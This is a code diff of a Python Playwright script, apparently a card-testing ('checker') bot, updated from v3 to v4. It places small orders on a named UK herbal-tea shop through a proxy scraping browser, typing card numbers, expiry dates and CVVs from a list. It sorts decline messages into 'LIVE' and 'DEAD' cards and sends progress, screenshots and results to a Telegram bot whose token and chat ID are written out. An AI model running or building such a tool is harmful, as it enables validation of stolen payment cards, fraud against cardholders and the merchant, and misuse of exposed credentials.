@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Herbs Hands Healing - Braintree Checker v3
-Fixed: Cart + Card Number + Reason Extraction
+Herbs Hands Healing - Braintree Checker v4
+With Telegram Notifications + Screenshots
 """
 
 from playwright.sync_api import sync_playwright
@@ -9,6 +9,14 @@ import time
 import random
 import json
 import re
+import requests
+import io
+from datetime import datetime
+
+# ═══ Telegram Bot ═══
+TG_TOKEN = "8647240736:AAEGXuwmtZkUvAfbURX2BcyyuoWD-TekP_0"
+TG_CHAT_ID = "6843321125"
+TG_API = f"https://api.telegram.org/bot{TG_TOKEN}"
 
 # ═══ BrightData ═══
 BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
@@ -19,7 +27,7 @@ BD_PORT = "9222"
 # ═══ Site ═══
 SITE_URL = "https://shop.herbs-hands-healing.co.uk"
 
-# ═══ Products (رخيصة) ═══
+# ═══ Products ═══
 PRODUCT_URLS = [
     f"{SITE_URL}/product/breathe-clear-herb-tea-2",
     f"{SITE_URL}/product/evening-peace-herb-tea",
@@ -42,20 +50,114 @@ ADDRESSES = [
 ]
 
 
+# ═══════════════════════════════════════════════════════════
+# Telegram Helper Functions
+# ═══════════════════════════════════════════════════════════
+
+def tg_send(text, parse_mode="HTML"):
+    """ابعت رسالة نصية"""
+    try:
+        r = requests.post(
+            f"{TG_API}/sendMessage",
+            json={
+                "chat_id": TG_CHAT_ID,
+                "text": text[:4096],  # Telegram limit
+                "parse_mode": parse_mode,
+            },
+            timeout=10,
+            verify=False,
+        )
+        return r.status_code == 200
+    except Exception as e:
+        print(f"[TG] Send error: {e}")
+        return False
+
+
+def tg_send_photo(photo_bytes, caption=""):
+    """ابعت صورة"""
+    try:
+        r = requests.post(
+            f"{TG_API}/sendPhoto",
+            data={
+                "chat_id": TG_CHAT_ID,
+                "caption": caption[:1024],
+                "parse_mode": "HTML",
+            },
+            files={"photo": ("screenshot.png", photo_bytes, "image/png")},
+            timeout=30,
+            verify=False,
+        )
+        return r.status_code == 200
+    except Exception as e:
+        print(f"[TG] Photo error: {e}")
+        return False
+
+
+def tg_send_error(page, error_msg, context_info=""):
+    """ابعت الخطأ + صورة الشاشة"""
+    # اطبع في الكونسول
+    print(f"❌ [ERROR] {error_msg}")
+    print(f"   Context: {context_info}")
+    
+    # ابعت رسالة نصية
+    timestamp = datetime.now().strftime("%H:%M:%S")
+    msg = (
+        f"🚨 <b>خطأ في البوت</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"⏰ الوقت: <code>{timestamp}</code>\n"
+        f"📍 السياق: <code>{context_info}</code>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"❌ الخطأ:\n<code>{error_msg[:500]}</code>"
+    )
+    tg_send(msg)
+    
+    # ابعت صورة
+    try:
+        if page:
+            screenshot = page.screenshot(full_page=False)
+            tg_send_photo(screenshot, caption=f"📸 {context_info}\n{error_msg[:200]}")
+    except Exception as e:
+        print(f"[TG] Screenshot error: {e}")
+
+
+def tg_log_step(step_name, status="✅", details=""):
+    """لوج خطوة"""
+    timestamp = datetime.now().strftime("%H:%M:%S")
+    msg = f"{status} <code>{timestamp}</code> | {step_name}"
+    if details:
+        msg += f"\n   <i>{details[:200]}</i>"
+    tg_send(msg)
+    print(f"{status} {step_name} {('- ' + details[:100]) if details else ''}")
+
+
+# ═══════════════════════════════════════════════════════════
+# BrightData Connection
+# ═══════════════════════════════════════════════════════════
+
 def connect_browser(p):
     cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"
     print("🌐 Connecting to BrightData...")
-    browser = p.chromium.connect_over_cdp(cdp_url, timeout=120000)
-    print("✅ Connected\n")
-    return browser
+    tg_log_step("🌐 الاتصال بـ BrightData", "⏳", "")
+    
+    try:
+        browser = p.chromium.connect_over_cdp(cdp_url, timeout=120000)
+        print("✅ Connected\n")
+        tg_log_step("🌐 الاتصال بـ BrightData", "✅", "تم الاتصال")
+        return browser
+    except Exception as e:
+        tg_log_step("🌐 الاتصال بـ BrightData", "❌", str(e)[:200])
+        raise
 
+
+# ═══════════════════════════════════════════════════════════
+# Add to Cart
+# ═══════════════════════════════════════════════════════════
 
 def add_to_cart_via_ajax(page):
-    """أضف منتج للسلة عبر AJAX مباشرة"""
+    """أضف منتج للسلة عبر AJAX"""
     print("🛒 Adding product to cart (AJAX)...")
     
-    # WooCommerce AJAX add to cart
-    product_id = "10510"  # Breathe & Clear Herb Tea ID
+    product_id = "10510"  # Breathe & Clear Herb Tea
     
     try:
         result = page.evaluate(f"""
@@ -80,9 +182,7 @@ def add_to_cart_via_ajax(page):
         
         if result and not result.get('error'):
             if 'cart_hash' in result or 'fragments' in result:
-                print(f"   ✅ Product added via AJAX")
                 return True
-        
         return False
         
     except Exception as e:
@@ -90,28 +190,32 @@ def add_to_cart_via_ajax(page):
         return False
 
 
-def add_to_cart(page):
+def add_to_cart(page, card_num):
     """أضف منتج للسلة"""
     print("🛒 Adding product to cart...")
+    tg_log_step("🛒 إضافة منتج للسلة", "⏳", card_num[:6] + "****")
     
     product_url = random.choice(PRODUCT_URLS)
-    print(f"   📦 Product: {product_url.split('/')[-1]}")
+    product_name = product_url.split('/')[-1]
+    print(f"   📦 Product: {product_name}")
     
     try:
         page.goto(product_url, timeout=60000, wait_until="domcontentloaded")
         time.sleep(5)
         
-        print("   🔎 Looking for add-to-cart button...")
-        
-        # ═══ انتظر الزر ═══
+        # انتظر الزر
         try:
             page.wait_for_selector("button[name='add-to-cart'], .single_add_to_cart_button", 
                                    timeout=20000)
         except:
             print("   ⚠️ Button not found, trying AJAX...")
-            return add_to_cart_via_ajax(page)
+            tg_log_step("🛒 زر الإضافة", "⚠️", "مش موجود - AJAX")
+            if add_to_cart_via_ajax(page):
+                tg_log_step("🛒 إضافة منتج للسلة", "✅", "AJAX نجح")
+                return True
+            return False
         
-        # ═══ اضغط الزر ═══
+        # اضغط
         add_btn_selectors = [
             "button[name='add-to-cart']",
             ".single_add_to_cart_button",
@@ -124,120 +228,103 @@ def add_to_cart(page):
                 btn = page.query_selector(sel)
                 if btn and btn.is_visible():
                     btn.click()
-                    print(f"   ✅ Clicked: {sel}")
                     added = True
                     break
             except:
                 continue
         
         if not added:
-            return add_to_cart_via_ajax(page)
+            if add_to_cart_via_ajax(page):
+                tg_log_step("🛒 إضافة منتج للسلة", "✅", "AJAX")
+                return True
+            return False
         
-        # ═══ انتظر الـ AJAX ═══
+        # انتظر
         print("   ⏳ Waiting for cart update (8s)...")
         time.sleep(8)
         
-        # ═══ تحقق من السلة - بعدة طرق ═══
+        # تحقق
         cart_verified = False
         
-        # طريقة 1: Header count
         try:
             count = page.evaluate("""
                 () => {
-                    const selectors = [
-                        '.cart-contents-count',
-                        '.cart-count',
-                        '.header-cart-count',
-                        '.cart-items-count',
-                        '[class*="cart-count"]'
-                    ];
-                    for (const sel of selectors) {
+                    const sels = ['.cart-contents-count', '.cart-count', 
+                                  '.header-cart-count', '[class*="cart-count"]'];
+                    for (const sel of sels) {
                         const el = document.querySelector(sel);
                         if (el) {
-                            const text = el.textContent.trim();
-                            if (text && text !== '0') return text;
+                            const t = el.textContent.trim();
+                            if (t && t !== '0') return t;
                         }
                     }
                     return '0';
                 }
             """)
-            
             if count != '0':
-                print(f"   ✅ Cart count: {count}")
                 cart_verified = True
         except:
             pass
         
-        # طريقة 2: روح صفحة السلة وتأكد
         if not cart_verified:
-            print("   🔎 Verifying via cart page...")
             try:
                 page.goto(f"{SITE_URL}/cart", timeout=30000, wait_until="domcontentloaded")
                 time.sleep(3)
                 cart_body = page.inner_text("body").lower()
-                
-                if 'empty' not in cart_body and ('subtotal' in cart_body or 'breathe' in cart_body or 'evening' in cart_body or 'pollitox' in cart_body):
-                    print(f"   ✅ Cart verified via page")
+                if 'empty' not in cart_body and ('subtotal' in cart_body or 'herb' in cart_body):
                     cart_verified = True
-                else:
-                    print(f"   ⚠️ Cart appears empty")
-            except Exception as e:
-                print(f"   ⚠️ Verify error: {str(e)[:80]}")
+            except:
+                pass
         
-        # طريقة 3: AJAX
         if not cart_verified:
-            print("   🔄 Trying AJAX add to cart...")
             if add_to_cart_via_ajax(page):
                 cart_verified = True
-                time.sleep(3)
+        
+        if cart_verified:
+            tg_log_step("🛒 إضافة منتج للسلة", "✅", product_name)
+        else:
+            tg_log_step("🛒 إضافة منتج للسلة", "⚠️", "لم يتم التحقق")
         
         return cart_verified
         
     except Exception as e:
         print(f"   ❌ Add to cart error: {str(e)[:100]}")
+        tg_log_step("🛒 إضافة منتج للسلة", "❌", str(e)[:200])
         return False
 
 
+# ═══════════════════════════════════════════════════════════
+# Fill Braintree Hosted Fields
+# ═══════════════════════════════════════════════════════════
+
 def fill_braintree_hosted_fields(page, num, mm, yy, cvv):
-    """ملء Braintree Hosted Fields بشكل صحيح"""
+    """ملء Braintree Hosted Fields"""
     
     filled = {'card': False, 'expiry': False, 'cvv': False}
     
-    # ═══ انتظر الـ iframes تحمّل ═══
     print("   ⏳ Waiting for Braintree iframes...")
     time.sleep(5)
     
-    # ═══ احصل على كل الـ frames ═══
     all_frames = page.frames
     print(f"   📋 Total frames: {len(all_frames)}")
     
-    # ═══ حلل كل frame ═══
     for frame in all_frames:
         frame_url = frame.url or ""
         frame_name = frame.name or ""
         
-        # تخطى الـ frames اللي مش بتاعة Braintree
         if not ('braintree' in frame_url.lower() or 
+                'braintree' in frame_name.lower() or
                 'card' in frame_name.lower() or
-                'number' in frame_name.lower() or
                 'cvv' in frame_name.lower() or
-                'expiration' in frame_name.lower() or
-                'hosted' in frame_url.lower() or
-                'hosted' in frame_name.lower()):
+                'expiration' in frame_name.lower()):
             continue
         
-        print(f"   🎯 Braintree frame: name={frame_name[:30]}, url={frame_url[:60]}")
+        print(f"   🎯 Frame: {frame_name[:40]}")
         
-        # ═══ Card Number ═══
+        # Card Number
         if not filled['card']:
-            for sel in [
-                "input[name='number']",
-                "input[name='card-number']",
-                "input[autocomplete='cc-number']",
-                "input[data-braintree-name='number']",
-                "input[type='tel']",
-                "input[type='text']",
-            ]:
+            for sel in ["input[autocomplete='cc-number']", "input[name='number']", 
+                        "input[name='card-number']"]:
                 try:
                     el = frame.query_selector(sel)
                     if el and el.is_visible():
@@ -245,20 +332,15 @@ def fill_braintree_hosted_fields(page, num, mm, yy, cvv):
                         time.sleep(0.5)
                         el.type(num, delay=random.randint(50, 100))
                         filled['card'] = True
-                        print(f"   ✅ Card number (via {sel})")
+                        print(f"   ✅ Card number")
                         break
                 except:
                     continue
         
-        # ═══ Expiry ═══
+        # Expiry
         if not filled['expiry']:
-            for sel in [
-                "input[name='expirationDate']",
-                "input[name='expiration']",
-                "input[name='expiration-date']",
-                "input[autocomplete='cc-exp']",
-                "input[data-braintree-name='expirationDate']",
-            ]:
+            for sel in ["input[name='expiration']", "input[name='expirationDate']",
+                        "input[autocomplete='cc-exp']"]:
                 try:
                     el = frame.query_selector(sel)
                     if el and el.is_visible():
@@ -266,19 +348,15 @@ def fill_braintree_hosted_fields(page, num, mm, yy, cvv):
                         time.sleep(0.5)
                         el.type(f"{mm}{yy[2:]}", delay=random.randint(50, 100))
                         filled['expiry'] = True
-                        print(f"   ✅ Expiry (via {sel})")
+                        print(f"   ✅ Expiry")
                         break
                 except:
                     continue
         
-        # ═══ CVV ═══
+        # CVV
         if not filled['cvv']:
-            for sel in [
-                "input[name='cvv']",
-                "input[name='cvv-field']",
-                "input[autocomplete='cc-csc']",
-                "input[data-braintree-name='cvv']",
-            ]:
+            for sel in ["input[name='cvv']", "input[name='cvv-field']",
+                        "input[autocomplete='cc-csc']"]:
                 try:
                     el = frame.query_selector(sel)
                     if el and el.is_visible():
@@ -286,7 +364,7 @@ def fill_braintree_hosted_fields(page, num, mm, yy, cvv):
                         time.sleep(0.5)
                         el.type(cvv, delay=random.randint(50, 100))
                         filled['cvv'] = True
-                        print(f"   ✅ CVV (via {sel})")
+                        print(f"   ✅ CVV")
                         break
                 except:
                     continue
@@ -294,39 +372,16 @@ def fill_braintree_hosted_fields(page, num, mm, yy, cvv):
         if all(filled.values()):
             break
     
-    # ═══ لو Card Number ما اتكتبش، جرب كل الـ frames ═══
-    if not filled['card']:
-        print("   🔄 Trying all frames for card number...")
-        for frame in all_frames:
-            try:
-                # جرب أي input ظاهر
-                inputs = frame.query_selector_all("input")
-                for inp in inputs:
-                    try:
-                        if inp.is_visible():
-                            # شوف لو input ده لسه فاضي، واكتب فيه الرقم
-                            current_val = inp.input_value()
-                            if not current_val or len(current_val) < 3:
-                                inp.click()
-                                time.sleep(0.3)
-                                inp.type(num, delay=50)
-                                filled['card'] = True
-                                print(f"   ✅ Card number (blind fill)")
-                                break
-                    except:
-                        continue
-                if filled['card']:
-                    break
-            except:
-                continue
-    
     return filled
 
 
+# ═══════════════════════════════════════════════════════════
+# Extract Reason from Page
+# ═══════════════════════════════════════════════════════════
+
 def extract_reason(page_text):
-    """استخراج سبب الرفض من HTML"""
+    """استخراج سبب الرفض"""
     
-    # ═══ Patterns ═══
     patterns = [
         (r"Reason:\s*Declined\s*-\s*Call\s*Issuer", "DECLINED_CALL_ISSUER"),
         (r"Reason:\s*Do\s*Not\s*Honor", "DO_NOT_HONOR"),
@@ -339,24 +394,23 @@ def extract_reason(page_text):
         (r"Reason:\s*Restricted\s*Card", "RESTRICTED_CARD"),
         (r"Reason:\s*Suspected\s*Fraud", "SUSPECTED_FRAUD"),
         (r"Reason:\s*Transaction\s*Not\s*Allowed", "NOT_ALLOWED"),
-        (r"Reason:\s*Invalid\s*Transaction", "INVALID_TXN"),
-        (r"Reason:\s*Violation", "VIOLATION"),
-        # Fallback: أي Reason
         (r"Reason:\s*([^\n<]+)", "DECLINED"),
     ]
     
     for pattern, code in patterns:
         m = re.search(pattern, page_text, re.IGNORECASE)
         if m:
-            full = m.group(0).strip()
-            return code, full
+            return code, m.group(0).strip()
     
-    # ═══ Success check ═══
     if 'thank you' in page_text.lower() and 'order' in page_text.lower():
         return "CHARGE $1", "Order placed successfully"
     
     return None, None
 
+
+# ═══════════════════════════════════════════════════════════
+# Check Card
+# ═══════════════════════════════════════════════════════════
 
 def check_card(browser, card, idx, total):
     """فحص بطاقة واحدة"""
@@ -364,17 +418,29 @@ def check_card(browser, card, idx, total):
     
     parts = card.strip().split("|")
     if len(parts) < 4:
+        tg_log_step(f"💳 [{idx}/{total}] بطاقة", "❌", "صيغة غلط")
         return "INVALID_FORMAT", "Bad format", 0
     
     num, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
     if len(yy) == 2:
         yy = "20" + yy
     
+    card_short = f"{num[:6]}****{num[-4:]}"
+    
     print(f"{'═'*60}")
-    print(f"🔍 [{idx}/{total}] {num[:6]}****{num[-4:]}")
+    print(f"🔍 [{idx}/{total}] {card_short}")
     print(f"{'═'*60}")
     
+    # Telegram notification
+    tg_send(
+        f"🚀 <b>بدء فحص بطاقة [{idx}/{total}]</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"💳 <code>{card_short}</code>\n"
+        f"⏰ {datetime.now().strftime('%H:%M:%S')}"
+    )
+    
     context = None
+    page = None
     try:
         context = browser.new_context(
             viewport={"width": 1366, "height": 900},
@@ -400,8 +466,8 @@ def check_card(browser, card, idx, total):
         
         # ═══ Step 1: Add to cart ═══
         print("📄 [1/8] Adding product to cart...")
-        if not add_to_cart(page):
-            print("   ❌ Failed to add to cart")
+        if not add_to_cart(page, card_short):
+            tg_log_step("❌ فشل في إضافة المنتج", "❌", card_short)
             try:
                 context.close()
             except:
@@ -410,6 +476,7 @@ def check_card(browser, card, idx, total):
         
         # ═══ Step 2: Go to checkout ═══
         print("📄 [2/8] Going to checkout...")
+        tg_log_step("📄 فتح صفحة الدفع", "⏳", "")
         page.goto(f"{SITE_URL}/checkout", timeout=90000, wait_until="domcontentloaded")
         time.sleep(3)
         
@@ -421,6 +488,7 @@ def check_card(browser, card, idx, total):
                 time.sleep(1)
             else:
                 print(f"   ✅ Title: {title[:60]}")
+                tg_log_step("🛡️ تخطي Cloudflare", "✅", title[:50])
                 break
         
         # ═══ Step 4: Wait for form ═══
@@ -428,14 +496,9 @@ def check_card(browser, card, idx, total):
         try:
             page.wait_for_selector("#billing_first_name", timeout=30000)
             print("   ✅ Form visible")
-        except:
-            print("   ⚠️ Form not found")
-            try:
-                html = page.content()
-                with open(f"debug_checkout_{idx}.html", "w") as f:
-                    f.write(html)
-            except:
-                pass
+            tg_log_step("📝 نموذج الدفع", "✅", "ظهر")
+        except Exception as e:
+            tg_send_error(page, "الفورم مش ظاهر", f"Card {card_short}")
             try:
                 context.close()
             except:
@@ -457,109 +520,98 @@ def check_card(browser, card, idx, total):
             page.fill("#billing_postcode", ad["postcode"])
             page.fill("#billing_phone", "07123456789")
             page.fill("#billing_email", em)
-            print(f"   ✅ Filled ({f} {l})")
+            tg_log_step("📝 تعبئة البيانات", "✅", f"{f} {l}")
         except Exception as e:
-            print(f"   ⚠️ {str(e)[:100]}")
+            tg_send_error(page, str(e)[:200], "Billing fill")
         
         time.sleep(1)
         
         # ═══ Step 6: Fill card ═══
         print("💳 [6/8] Filling card...")
+        tg_log_step("💳 إدخال البطاقة", "⏳", "")
         
         fill_result = fill_braintree_hosted_fields(page, num, mm, yy, cvv)
         
-        print(f"   📊 Card fill result: {fill_result}")
-        
-        if not all(fill_result.values()):
-            print(f"   ⚠️ Card fill incomplete")
+        if all(fill_result.values()):
+            tg_log_step("💳 إدخال البطاقة", "✅", f"{fill_result}")
+        else:
+            tg_send_error(page, f"Card fill incomplete: {fill_result}", "Card fill")
+            tg_log_step("💳 إدخال البطاقة", "⚠️", f"{fill_result}")
         
         time.sleep(1)
         
         # ═══ Step 7: Accept terms + Place order ═══
         print("👆 [7/8] Placing order...")
         
-        # Accept terms
         try:
             terms = page.query_selector("#terms")
             if terms and not terms.is_checked():
                 terms.check()
-                print("   ✅ Terms checked")
         except:
             try:
                 page.click("label[for='terms']")
-                print("   ✅ Terms clicked")
             except:
-                print("   ⚠️ Terms not found")
+                pass
         
-        # GDPR
         try:
             gdpr = page.query_selector("#gdpr_woo_consent")
             if gdpr and not gdpr.is_checked():
                 gdpr.check()
-                print("   ✅ GDPR checked")
         except:
             pass
         
         time.sleep(1)
         
-        # Place order
         try:
             page.click("#place_order")
-            print("   ✅ Clicked Place Order")
+            tg_log_step("👆 تنفيذ الطلب", "✅", "تم الضغط")
         except:
-            try:
-                page.click("button[name='woocommerce_checkout_place_order']")
-                print("   ✅ Clicked (alt)")
-            except:
-                print("   ⚠️ Could not click")
+            tg_log_step("👆 تنفيذ الطلب", "⚠️", "لم يتم الضغط")
         
         # ═══ Step 8: Wait for response ═══
         print("⏳ [8/8] Waiting for response...")
+        tg_log_step("⏳ انتظار الرد", "⏳", "40s max")
+        
         result_code = "UNKNOWN"
         result_text = ""
         
         for i in range(40):
             time.sleep(1)
             
-            # ═══ FIRST: HTML extraction ═══
+            # HTML
             try:
                 page_text = page.inner_text("body")
                 code, text = extract_reason(page_text)
                 if code:
                     result_code = code
                     result_text = text
-                    print(f"   🎯 Found: {text}")
                     break
             except:
                 pass
             
-            # ═══ SECOND: API responses ═══
+            # API
             try:
                 responses = page.evaluate("() => window.__all_responses || []")
                 for r in reversed(responses):
                     url = r.get('url', '')
                     body = r.get('body', '')
                     
-                    if any(x in url for x in ['.js', '.css', '.png', '.jpg']):
+                    if any(x in url for x in ['.js', '.css', '.png']):
                         continue
                     
-                    # WooCommerce checkout
                     if 'wc-ajax=checkout' in url:
                         try:
                             data = json.loads(body)
-                            
                             if data.get('result') == 'success':
                                 result_code = "CHARGE $1"
-                                result_text = data.get('redirect', 'Success')
+                                result_text = "Success"
                                 break
                             elif data.get('result') == 'failure':
                                 messages = str(data.get('messages', ''))
-                                # Extract Reason
                                 m = re.search(r'Reason:\s*([^\n<]+)', messages)
                                 if m:
                                     reason = m.group(1).strip()
                                     result_text = reason
-                                    
                                     r_low = reason.lower()
                                     if 'call issuer' in r_low:
                                         result_code = "DECLINED_CALL_ISSUER"
@@ -567,50 +619,35 @@ def check_card(browser, card, idx, total):
                                         result_code = "INSUFFICIENT_FUNDS"
                                     elif 'do not honor' in r_low:
                                         result_code = "DO_NOT_HONOR"
-                                    elif 'expired' in r_low:
-                                        result_code = "EXPIRED_CARD"
-                                    elif 'invalid' in r_low:
-                                        result_code = "INVALID_CARD"
-                                    elif 'cvv' in r_low:
-                                        result_code = "CVV_INVALID"
                                     else:
                                         result_code = "DECLINED"
                                 break
                         except:
                             pass
-                    
-                    # Braintree
-                    if 'braintree' in url.lower():
-                        try:
-                            data = json.loads(body)
-                            if 'errors' in data:
-                                errors = data['errors']
-                                if errors:
-                                    ext = errors[0].get('extensions', {})
-                                    error_code = ext.get('errorCode', '')
-                                    error_msg = errors[0].get('message', '')
-                                    result_code = error_code or "DECLINED"
-                                    result_text = error_msg[:200]
-                                    break
-                        except:
-                            pass
-                
                 if result_code != "UNKNOWN":
                     break
             except:
                 pass
             
-            if (i + 1) % 5 == 0:
-                print(f"   ⏳ {i+1}s...")
+            if (i + 1) % 10 == 0:
+                tg_log_step(f"⏳ انتظار ({i+1}s)", "⏳", "")
         
-        # Save HTML
-        try:
-            html = page.content()
-            with open(f"result_{idx}.html", "w") as f:
-                f.write(html)
-            print(f"   💾 Saved result_{idx}.html")
-        except:
-            pass
+        # ═══ لو لسه UNKNOWN - ابعت صورة ═══
+        if result_code == "UNKNOWN":
+            try:
+                page_text = page.inner_text("body")
+                tg_send(
+                    f"⚠️ <b>لم يتم التعرف على الرد</b>\n"
+                    f"━━━━━━━━━━━━━━━━━━━━\n"
+                    f"💳 <code>{card_short}</code>\n"
+                    f"📄 نص الصفحة (أول 500 حرف):\n"
+                    f"<code>{page_text[:500]}</code>"
+                )
+                # ابعت صورة
+                screenshot = page.screenshot(full_page=False)
+                tg_send_photo(screenshot, f"📸 {card_short} - UNKNOWN")
+            except:
+                pass
         
         try:
             context.close()
@@ -618,16 +655,46 @@ def check_card(browser, card, idx, total):
             pass
         
     except Exception as e:
-        print(f"❌ Error: {str(e)[:150]}")
-        result_code = f"ERR: {str(e)[:60]}"
-        result_text = str(e)[:100]
+        tg_send_error(page, str(e)[:300], f"Card {card_short}")
         if context:
             try:
                 context.close()
             except:
                 pass
+        result_code = f"ERR: {str(e)[:60]}"
+        result_text = str(e)[:100]
     
     elapsed = round(time.time() - t0, 1)
+    
+    # ═══ Result notification ═══
+    is_live = result_code in [
+        'INSUFFICIENT_FUNDS', 'DECLINED_CALL_ISSUER', 'DO_NOT_HONOR',
+        'DECLINED', 'SUSPECTED_FRAUD', 'RESTRICTED_CARD', 'NOT_ALLOWED',
+        'STOPPED_BILLING', 'CHARGE $1', 'TOKENIZED', 'VIOLATION',
+    ]
+    
+    if result_code == "CHARGE $1":
+        icon = "🔥🔥"
+        status = "CHARGE"
+    elif is_live:
+        icon = "🔥"
+        status = "LIVE"
+    elif result_code.startswith("ERR") or result_code in ['NO_FORM', 'NO_CART', 'UNKNOWN']:
+        icon = "⚠️"
+        status = "ERROR"
+    else:
+        icon = "❌"
+        status = "DEAD"
+    
+    tg_send(
+        f"{icon} <b>{status}</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"💳 <code>{card_short}</code>\n"
+        f"📝 <code>{result_code}</code>\n"
+        f"💬 {result_text[:200] if result_text else '-'}\n"
+        f"⏱️ {elapsed}s"
+    )
+    
     print(f"\n📝 {result_code}")
     if result_text:
         print(f"   💬 {result_text}")
@@ -636,15 +703,33 @@ def check_card(browser, card, idx, total):
     return result_code, result_text, elapsed
 
 
+# ═══════════════════════════════════════════════════════════
+# Main
+# ═══════════════════════════════════════════════════════════
+
 def main():
     print("=" * 60)
-    print("  🌿 Herbs Hands Healing - v3 (Fixed)")
+    print("  🌿 Herbs Hands Healing - v4 (Telegram)")
     print("  🚀 BrightData Scraping Browser")
     print("=" * 60)
+    
+    # ═══ Startup notification ═══
+    tg_send(
+        f"🚀 <b>البوت اشتغل</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"💳 عدد البطاقات: <code>{len(CARDS)}</code>\n"
+        f"🌐 Zone: <code>{BD_USER[-30:]}</code>\n"
+        f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    )
+    
     print(f"\n  💳 Cards: {len(CARDS)}\n")
     
     with sync_playwright() as p:
-        browser = connect_browser(p)
+        try:
+            browser = connect_browser(p)
+        except Exception as e:
+            tg_send(f"❌ <b>فشل الاتصال بـ BrightData</b>\n<code>{str(e)[:300]}</code>")
+            return
         
         results = []
         for idx, card in enumerate(CARDS, 1):
@@ -652,6 +737,7 @@ def main():
                 code, text, elapsed = check_card(browser, card, idx, len(CARDS))
             except Exception as e:
                 code, text, elapsed = f"ERR: {str(e)[:60]}", str(e)[:100], 0
+                tg_send(f"❌ <b>خطأ فادح</b>\n<code>{str(e)[:300]}</code>")
             
             results.append({
                 'card': card,
@@ -663,6 +749,7 @@ def main():
             if idx < len(CARDS):
                 delay = random.uniform(10, 15)
                 print(f"⏸️  Waiting {delay:.1f}s...\n")
+                tg_log_step(f"⏸️ انتظار {delay:.1f}s", "⏳", "")
                 time.sleep(delay)
         
         try:
@@ -675,65 +762,52 @@ def main():
     print("📊 النتائج النهائية")
     print("=" * 60)
     
-    # ═══ التصنيف الجديد الصح ═══
     live_codes = [
-        'INSUFFICIENT_FUNDS',       # ✅ Live
-        'DECLINED_CALL_ISSUER',     # ✅ Live ← ده اللي كنا بنشوفه
-        'DO_NOT_HONOR',             # ✅ Live
-        'DECLINED',                 # ✅ Live
-        'SUSPECTED_FRAUD',          # ✅ Live
-        'RESTRICTED_CARD',          # ✅ Live
-        'NOT_ALLOWED',              # ✅ Live
-        'STOPPED_BILLING',          # ✅ Live
-        'CHARGE $1',                # ✅ CHARGE
-        'TOKENIZED',                # ✅ Card valid
-        'VIOLATION',                # ✅ Live
-    ]
-    
-    dead_codes = [
-        'INVALID_CARD',
-        'INVALID_CARD_NUMBER',
-        'EXPIRED_CARD',
-        'CVV_INVALID',
-        'LOST_STOLEN',
-        'INVALID_TXN',
-        'INVALID_FORMAT',
+        'INSUFFICIENT_FUNDS', 'DECLINED_CALL_ISSUER', 'DO_NOT_HONOR',
+        'DECLINED', 'SUSPECTED_FRAUD', 'RESTRICTED_CARD', 'NOT_ALLOWED',
+        'STOPPED_BILLING', 'CHARGE $1', 'TOKENIZED', 'VIOLATION',
     ]
     
     live_count = 0
     dead_count = 0
     error_count = 0
+    charge_count = 0
+    
+    summary_lines = ["📊 <b>ملخص النتائج</b>", "━━━━━━━━━━━━━━━━━━━━"]
     
     for r in results:
         code = r['code']
         
         if code == 'CHARGE $1':
-            status = "🔥🔥 CHARGE"
+            status = "🔥 CHARGE"
+            charge_count += 1
             live_count += 1
         elif code in live_codes:
             status = "🔥 LIVE"
             live_count += 1
-        elif code in dead_codes:
-            status = "❌ DEAD"
-            dead_count += 1
-        elif code.startswith('ERR') or code in ['NO_FORM', 'NO_CART', 'UNKNOWN', 'FILL_FAILED']:
+        elif code.startswith('ERR') or code in ['NO_FORM', 'NO_CART', 'UNKNOWN', 'INVALID_FORMAT']:
             status = "⚠️ ERROR"
             error_count += 1
         else:
-            status = "❓ UNKNOWN"
-            error_count += 1
+            status = "❌ DEAD"
+            dead_count += 1
         
         print(f"\n💳 {r['card']}")
         print(f"   📝 {r['code']}")
-        if r['text']:
-            print(f"   💬 {r['text']}")
         print(f"   {status} | ⏱️ {r['elapsed']}s")
+        
+        summary_lines.append(
+            f"{status} | <code>{r['card'][:6]}****{r['card'][-4:15]}</code>\n"
+            f"   <code>{code}</code> - {r['elapsed']}s"
+        )
     
-    print(f"\n{'='*60}")
-    print(f"🔥 Live:   {live_count}")
-    print(f"❌ Dead:   {dead_count}")
-    print(f"⚠️  Errors: {error_count}")
-    print(f"{'='*60}")
+    summary_lines.append("━━━━━━━━━━━━━━━━━━━━")
+    summary_lines.append(f"🔥 CHARGE: {charge_count}")
+    summary_lines.append(f"✅ LIVE:   {live_count}")
+    summary_lines.append(f"❌ DEAD:   {dead_count}")
+    summary_lines.append(f"⚠️ ERRORS: {error_count}")
+    
+    tg_send("\n".join(summary_lines))
 
 
 if __name__ == "__main__":
